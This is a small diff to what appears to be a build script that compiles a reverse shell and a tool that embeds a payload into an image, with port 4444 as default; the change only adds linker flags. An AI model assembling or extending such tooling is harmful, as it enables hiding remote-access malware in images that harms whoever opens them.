@@ -26,7 +26,8 @@ MY_PORT=${MY_PORT:-4444}
 # 5. Compile
 echo "[*] Compiling binaries..."
 gcc reverse_shell.c -o reverse_shell
-gcc embed_payload.c -o embed_payload -lpng
+gcc embed_payload.c -o embed_payload -lpng -lz -lm
+
 
 # 6. Embedding
 echo "[*] Crafting image..."
